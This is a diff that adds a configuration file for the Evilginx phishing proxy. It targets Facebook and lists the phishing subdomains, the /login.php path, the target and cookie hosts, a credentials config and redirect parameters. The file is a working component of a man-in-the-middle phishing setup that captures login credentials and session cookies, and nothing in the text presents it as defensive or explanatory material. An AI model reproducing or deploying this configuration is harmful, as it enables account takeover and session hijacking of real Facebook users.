@@ -1,0 +1,12 @@
+[site]
+name=facebook
+site_conf=["www.facebook.com.conf","m.facebook.com.conf"]
+creds_conf=facebook.creds
+phish_subdomains=["www","m"]
+phish_paths=["/login.php"]
+target_hosts=["www.facebook.com","m.facebook.com"]
+cookie_hosts=["facebook.com"]
+redir_arg=rc
+success_arg=rd
+log_name=evilginx-facebook.log
+cert_subdomains=["www","m"]
